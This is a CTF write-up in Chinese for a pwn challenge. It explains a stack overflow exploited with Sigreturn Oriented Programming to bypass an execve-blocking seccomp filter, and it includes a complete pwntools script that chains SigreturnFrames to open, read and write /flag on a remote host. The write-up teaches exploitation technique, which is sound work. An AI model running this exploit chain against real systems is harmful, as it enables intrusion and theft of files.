# SROP

## 题目简述

程序在栈上只分配 8 字节缓冲区，却通过 `syscall(0, 0, buf, 0x900)` 读入大量数据。二进制无 Canary、无 PIE、开启 NX，并提供 `syscall; ret` 与“把 `rax` 设为 15”的 gadget。seccomp 只禁止 `execve`、`execveat`，因此适合用 Sigreturn Oriented Programming 控制全部寄存器，再执行 `open/read/write` 读取 `/flag`。

## 解题过程

反汇编 `gadget` 可得到：

```asm
syscall
ret
push 0xf
pop rax
ret
```

Linux x86-64 的 `rt_sigreturn` 系统调用号为 15。控制流进入 `push 0xf; pop rax; ret` 后，再返回 `syscall; ret`，内核会把当前栈上的伪造 `rt_sigframe` 恢复到寄存器中。栈溢出到返回地址的偏移为 $8+8=16$ 字节。

利用分两阶段：第一帧执行 `read(0, .bss, 0x1000)` 并把栈迁到 `.bss`；第二阶段依次放置三组触发器和 SigreturnFrame，完成：

```text
open("/flag", 0) -> read(3, buffer, 0x100) -> write(1, buffer, 0x100)
```

沙盒允许系统调用号 2、0、1。题目进程正常只占用标准输入、输出和错误三个描述符，因此 `open` 返回值可按 3 使用。

```python
import time

from pwn import *

context.arch = "amd64"
context.os = "linux"

elf = context.binary = ELF(args.BIN or "./pwn", checksec=False)
if not args.HOST or not args.PORT:
    raise SystemExit("usage: python exp.py BIN=./pwn HOST=<host> PORT=<port>")
io = remote(args.HOST, int(args.PORT))

syscall_ret = ROP(elf).find_gadget(["syscall", "ret"]).address
set_rax_15 = next(elf.search(asm("push 15; pop rax; ret")))
staging = elf.bss() + 0x400

frame_size = len(bytes(SigreturnFrame()))
segment_size = 16 + frame_size  # 两个地址加一份 frame
path_address = staging + 3 * segment_size


def invoke_sigreturn(frame):
    return flat(set_rax_15, syscall_ret, bytes(frame))


# 第一帧：把完整 ORW 链读到 .bss，并将 rsp 切到该处。
stage1_frame = SigreturnFrame()
stage1_frame.rax = constants.SYS_read
stage1_frame.rdi = 0
stage1_frame.rsi = staging
stage1_frame.rdx = 0x1000
stage1_frame.rip = syscall_ret
stage1_frame.rsp = staging

# 第二帧：open("/flag", O_RDONLY)。
open_frame = SigreturnFrame()
open_frame.rax = constants.SYS_open
open_frame.rdi = path_address
open_frame.rsi = 0
open_frame.rdx = 0
open_frame.rip = syscall_ret
open_frame.rsp = staging + segment_size

# 第三帧：read(3, path_address, 0x100)，复用路径区作为输出缓冲区。
read_frame = SigreturnFrame()
read_frame.rax = constants.SYS_read
read_frame.rdi = 3
read_frame.rsi = path_address
read_frame.rdx = 0x100
read_frame.rip = syscall_ret
read_frame.rsp = staging + 2 * segment_size

# 第四帧：write(1, path_address, 0x100)。
write_frame = SigreturnFrame()
write_frame.rax = constants.SYS_write
write_frame.rdi = 1
write_frame.rsi = path_address
write_frame.rdx = 0x100
write_frame.rip = syscall_ret

stage1 = b"A" * 16 + invoke_sigreturn(stage1_frame)
stage2 = (
    invoke_sigreturn(open_frame)
    + invoke_sigreturn(read_frame)
    + invoke_sigreturn(write_frame)
    + b"/flag\x00"
)

# 稍作分隔，避免两个阶段被第一次 read 一并取走。
io.send(stage1)
time.sleep(0.1)
io.send(stage2)
io.interactive()
```

## 方法总结

SROP 的核心是用系统调用号 15 让内核替攻击者一次性恢复通用寄存器、`rip` 和 `rsp`。该题先用一帧把空间扩展到 `.bss`，再串联 `open/read/write` 三帧绕过禁用 `execve` 的 seccomp。gadget 地址应从实际附件动态搜索，避免不同编译产物导致硬编码地址失效。
